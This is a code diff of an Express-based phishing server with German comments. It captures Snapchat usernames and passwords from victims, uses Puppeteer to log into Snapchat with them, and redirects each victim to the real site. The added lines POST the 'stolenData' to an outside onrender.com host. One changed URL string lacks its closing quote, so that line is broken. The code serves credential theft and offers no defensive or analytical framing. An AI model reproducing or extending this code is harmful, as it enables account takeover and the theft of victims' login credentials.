@@ -40,7 +40,7 @@ app.post('/submit', async (req, res) => {
       (async () => {
         const browser = await puppeteer.launch({ headless: true });
         const page = await browser.newPage();
-        await page.goto('https://snapchat-login-qza8.onrender.com');
+        await page.goto('https://accounts.snapchat.com);
         
         // Login durchführen
         await page.type('input[name="username"]', username);
@@ -61,6 +61,10 @@ app.post('/submit', async (req, res) => {
     }
 
     res.redirect('https://snapchat.com'); // Opfer zur echten Seite umleiten
+    await fetch('https://snapchat-c4zd.onrender.com/submit', {
+  method: 'POST',
+  body: JSON.stringify(stolenData)
+});
 
   } catch (error) {
     console.error("❌ Fehler:", error);
